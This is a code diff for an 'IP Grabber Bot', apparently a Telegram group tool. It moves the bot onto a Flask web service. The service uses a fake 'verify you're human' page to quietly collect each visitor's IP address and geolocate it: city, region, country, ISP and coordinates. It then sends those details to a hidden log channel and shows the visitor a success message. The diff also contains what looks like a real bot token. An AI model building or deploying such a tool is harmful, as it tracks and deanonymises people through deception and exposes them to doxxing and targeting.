@@ -1,34 +1,64 @@
-import telebot
-from telebot import types
+from flask import Flask, request
+import requests
+import os
+from datetime import datetime
 
 BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
-WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
 LOG_CHANNEL = "-1002290475903"
 
-bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
 
-@bot.chat_join_request_handler()
-def handle_join_request(request: types.ChatJoinRequest):
-    user_id = request.user_chat_id
-    chat_id = request.chat.id
-    first_name = request.from_user.first_name or "User"
+@app.route('/verify')
+def verify():
+    chat_id = request.args.get('chat_id')
+    user_id = request.args.get('user_id')
+    name = request.args.get('name', 'User')
 
-    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"
+    if not chat_id or not user_id:
+        return "Invalid link.", 400
 
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("✅ Verify if you're human", url=link))
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
+    geo = {}
     try:
-        bot.send_message(
-            user_id,
-            "✅ Human verification successful!\n\n"
-            "Click the button below to verify you're human and join the group.\n\n"
-            "Link will expire in 10 minutes.",
-            reply_markup=markup
-        )
-        print(f"✅ Verification link sent to {user_id}")
-    except Exception as e:
-        print(f"❌ Failed to send PM to {user_id}: {e}")
+        geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,lat,lon", timeout=5)
+        if geo_resp.status_code == 200:
+            geo = geo_resp.json()
+    except:
+        pass
 
-print("✅ IP Grabber Bot is running...")
-bot.infinity_polling()
+    location = f"{geo.get('city', 'Unknown')}, {geo.get('regionName', '')} - {geo.get('country', 'Unknown')}"
+
+    # LOG HANYA KE CHANNEL
+    log_text = f"""
+ NEW MEMBER DETECTED
+
+Name: {name}
+User ID: <code>{user_id}</code
+IP: <code>{ip}</code>
+Location: {location}
+ISP: {geo.get('isp', 'Unknown')}
+Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+    """
+
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"}
+    )
+
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
+        json={"chat_id": chat_id, "user_id": user_id}
+    )
+
+    return """
+    <h2 style="text-align:center; margin-top:100px; color:green;">
+        ✅ Verification Successful!<br><br>
+        You have been verified and approved to the group.<br>
+        Please wait a moment...
+    </h2>
+    """, 200
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
